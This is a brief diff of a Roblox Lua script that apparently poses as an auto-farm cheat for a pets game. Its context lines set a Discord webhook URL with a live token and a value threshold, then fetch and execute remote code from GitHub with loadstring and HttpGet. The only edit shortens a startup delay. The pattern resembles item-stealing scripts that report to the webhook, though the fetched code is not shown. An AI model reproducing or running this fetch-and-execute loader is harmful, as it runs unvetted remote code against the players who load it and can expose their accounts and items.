@@ -3,7 +3,7 @@ _G.Webhook = "https://discord.com/api/webhooks/1297617074503421992/soGduy-XBnC5q
 _G.Min = 1000000
 loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetsGO/refs/heads/main/AutoFarmOP.lua", true))()
 
-wait(10)
+wait(4)
 local ba=Instance.new("ScreenGui")
 
 local ca=Instance.new("TextLabel")local da=Instance.new("Frame")
